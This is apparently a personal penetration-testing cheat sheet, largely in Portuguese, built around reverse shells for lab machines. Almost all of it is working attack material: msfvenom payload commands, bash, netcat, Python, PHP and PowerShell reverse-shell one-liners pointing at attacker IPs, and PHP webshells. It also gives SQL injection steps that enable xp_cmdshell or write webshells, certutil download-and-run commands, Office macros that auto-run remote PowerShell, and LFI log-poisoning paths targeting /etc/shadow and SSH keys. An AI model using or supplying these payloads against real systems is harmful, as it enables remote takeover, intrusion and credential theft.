*** Reverse Shell ***

======================== Ouvindo Requisições de Rede =================== 

sudo tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo -v

==================== Criando uma SHARE =====================

1. No Kali
	sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
2. Na máquina Windows
	net use z: \\10.10.14.8\kali
3. Copiar arquivos do Windows para o Kali
	copy 20220826162109_BloodHound.zip z:
	
========================== msfvenom ==========================

-> Windows com Meterpreter (necessário metasploit)
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB_IP> LPORT=<PORT> -f format -o exploit.format

1. Exemplo para aspnet
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.214 LPORT=80 -f aspx -o exploit.aspx
2. Abrir o meterpreter através do metasploit
	use /exploit/multi/handler
3. Setar o Payload
	set payload /windows/meterpreter/reverse_tcp
4. Configurar LHOST E LPORT
	
-> Web Application Resources para Java(.war)
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.183 LPORT=9090 -f war -o exploit.war

-> Web page codes (hta)
1. Common Revshell
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.214 LPORT=9090 -f hta-psh -o Common.hta
2. Meterpreter revshell (não esquecer de setar payload do multi handler como windows/meterpreter/reverse_tcp)
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.184 LPORT=9090 -f hta-psh -o meterpreter.hta
	
-> PHP
	msfvenom -p php/reverse_php LHOST=192.168.119.183 LPORT=9090 -f raw > shell.php
	
-> Linux com meterpreter
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.239 LPORT=1337 -f elf > file.elf
	
-> Linux sem meterpreter
	msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.15.187 LPORT=4444 -f elf > shell.elf
	
-> Windows sem meterpreter
	msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.185 LPORT=80 -f exe > Nickel.exe

-> Windows com meterpreter
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.143 LPORT=80 -f exe > Iperius.exe


========================== Code Payloads ==========================

[+ BASH]

	bash -i >& /dev/tcp/10.10.15.187/4444 0>&1

After Wrapping:

	bash -c 'bash -i >& /dev/tcp/10.10.15.242/80 0>&1'

-> REMEMBER TO USE URL ENCODING!!!!
	bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.242%2F80%200%3E%261%27

-> Netcat
	nc 192.168.119.214 80 -e /bin/bash

	
[+ CMD]

	nc.exe 192.168.119.143 80 -e cmd.exe
	
-> Rembeber to use URL Encoding

	nc.exe%2010.10.14.13%209090%20-e%20cmd.exe
	
-> Remember tu use 

[+ PHP]

-> Pure Code

	<pre>
	<?php
	Echo passthru($_GET['cmd']);
	?>
	</pre>

-> Segunda opção

	<?php system($_GET[“cmd”]);?>;
	
-> terceira opção

	<?php system("bash -c 'bash -i >& /dev/tcp/192.168.119.214/443 0>&1'"); ?>

-> PHP CODE INJECTION

	shell_exec('nc 192.168.119.214 80 -e /bin/bash')
	shell_exec('bash -i >& /dev/tcp/1192.168.119.183/9090 0>&1')
	
-> PHP Command Injection
	php -r '$sock=fsockopen("10.10.15.242",443);exec("sh <&3 >&3 2>&3");'
	php -r '$sock=fsockopen("10.10.10.10",9001);system("sh <&3 >&3 2>&3");'

[+ Python]

	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.242",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.143",80)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
	python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.119.143",80));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
	
	
[+ Powershell ]

	"c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (new-object net.webclient).downloadString('http://10.10.15.242:8080/rev.ps1')"

	powershell -c \"New-Object System.Net.WebClient.DownloadFile('http://192.168.119.183/mimikatz.exe','mimikatz.exe')\"
	
================================ Reverse Shell SQLInjection ================================

[+ MSSQL]

-> Com credenciais

1 - Com as credenciais em mãos, obter acesso ao banco com Impacket-MSSQL
 	> impacket-mssqlclient sa@10.11.1.111
2 - Com acesso ao banco, permitiremos a configuração de comandos de shell
	SQL> enable_xp_cmdshell
3 - Com essa configuração iremos fazer um revshell com powershell
	SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://192.168.119.183:8081/rv.ps1\")

-> Com injection

1 . Habilitar o EXEC do MSSQL a partir de queries
		  > ' ; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
		  > ' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
2 . Fazer download de um webshell
		 $ cd /usr/share/webshells/asp
 		 >  '; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.119.183:8081/cmdasp.asp' ;--

[+ MySQL Commands]
1. Utilizar order by para ver quantas colunas tem(caso tenha n >= terá retorno)
	http://10.10.10.143/room.php?cod=1 order by 5
2. Utilizar Union para retornar infos
	http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7
-> Códigos úteis de MySQL
	database()
	user()
	load_file('/etc/passwd')
	
3. Escrevendo arquivos do load file em hacked.txt
-> Escrever em /var/www/html/ para conseguir ver pela pagina web
	http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'
	
4.1 Escrevendo um Payload que tenha exec para métodos post
	http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
4.2 Escrevendo Payload com CMD
	http://10.10.10.143/room.php?cod=-1%20union%20select%201,%22%3C?php%20Echo%20passthru($_GET[%27cmd%27]);?%3E%22,3,4,5,6,7%20into%20outfile%20%27/var/www/html/test.php%27
	
5.1 Reverse shell com post
	curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.13/1234 0>&1"'
5.2 Reverse Shell com get CMD
	http://10.10.10.143/pwned.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.13%2F1234%200%3E%261%27


[+ phpMyAdmin]

-> Na aba SQL
SELECT "<?php system($_GET[“cmd”]);?>;" INTO OUTFILE 'C:/wamp/www/uploader.php';

============================= Reverse Shell Windows =====================================

1. Criar o Payload
	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.218 LPORT=9090 -f exe -o Common.exe
	
//
-> Fazendo com SMB
2. On Kali, in the same directory as reverse.exe:
	sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
3. Copiar o Payload para o windows
	copy \\10.10.14.13\kali\CherryTreeTemplate.ctb C:\Users\jpbrs\Desktop\CherryTreeTemplate.ctb
	
-> Fazendo com HTTP
2. Criar um Web Server no Diretório do Payload
	python -m http.server --bind 192.168.0.33 9000
3. Dar um curl no arquivo
	curl.exe -o Common.exe http://192.168.0.33:9000/Common.exe
//

4. Reiniciar o serviço com um nc-nlvp 53 no Kali e ser feliz


-> Reverse Shell com Certutils
1. Criar o payload
	msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe

2. Colocar o payload disponível com webserver
	python -m http.server --bind 192.168.0.33 9000
	
3. Baixar e executar o payload com certutils
	certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe



=============================== Office ===================================

-> Powershell

1. Criando o payload em base64 para rodar no powershell do macrOS (do word ou excel)
	LHOST=192.168.119.183
	LPORT=4444
	pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > reverse-shell.txt

2. Adicionando o código no macros do docx para a vítima baixar o código através do powershell
	Sub AutoOpen()
	MyMacro
	End Sub
	Sub Document_Open()
	MyMacro
	End Sub
	Sub MyMacro()
	Dim Str As String
	Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('http://192.168.119.239:80/reverse-shell.txt'); iex 'powershell -E $code'"""
	CreateObject("Wscript.Shell").Run Str
	End Sub

-> Netcat
	Sub AutoOpen()
	MyMacro
	End Sub
	Sub Document_Open()
	MyMacro
	End Sub
	Sub MyMacro()
	Shell("bash -c ""ncat -e cmd.exe 192.168.119.239 443""")
	End Sub


========================= Directory Traversal / LFI => Arquivos Importantes =========================

1. /etc/passwd/
2. /etc/shadow/
3. /etc/tomcat7/tomcat-users.xml
4. /home/user/.ssh/id_rsa


========================= LFI ========================

-> Inserindo payload no Log de Acesso
1. nc -nv $IP 80 
2. GET /<?php system($_GET['cmd']); ?>

[+Checando se é LFI ou Directory Traversal] -> Precisa carregar novamente
	http://192.168.0.114/manage.php?file=../../../../../var/www/html/index.php

[+Verificando se Existe SSH Escondido]
	http://192.168.0.114/addrecorddb.php?file=../../../../../etc/knockd.conf

Locais
[+ APACHE]
	../../../../../../var/log/apache2/access.log&cmd=id
	../../../../../../var/log/apache/access.log
	../../../../../../etc/httpd/logs/access_log
	../../../../../../var/log/httpd/access_log

RHEL / Red Hat / CentOS / Fedora Linux Apache access file location – /var/log/httpd/access_log

Debian / Ubuntu Linux Apache access log file location – /var/log/apache2/access.log
FreeBSD Apache access log file location – /var/log/httpd-access.log
/var/log/nginx/access.log




